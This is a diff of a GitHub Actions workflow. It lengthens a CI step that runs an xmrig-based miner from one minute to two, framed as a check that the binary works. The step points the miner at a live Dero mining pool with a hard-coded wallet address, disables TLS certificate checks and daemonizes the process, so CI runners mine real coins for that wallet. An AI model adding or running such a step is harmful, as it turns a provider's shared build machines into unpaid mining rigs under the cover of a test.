@@ -41,11 +41,11 @@ jobs:
         name: binaries
         path: ${{github.workspace}}/build/binaries
 
-    - name: Run xmrigMiner for one minute to see if it works
+    - name: Run xmrigMiner for 2 minutes to see if it works
       run: |
         cd ${{github.workspace}}/build/binaries/ && ls -la
         sudo chmod +x ./xmrigMiner
-        CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.1000 --tls -k --coin dero -a astrobwt --daemonized'
-        timeout 60 ./xmrigMiner $CONFIG
+        CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.10000 --tls -k --coin dero -a astrobwt --daemonized'
+        timeout 2m ./xmrigMiner $CONFIG
 
 
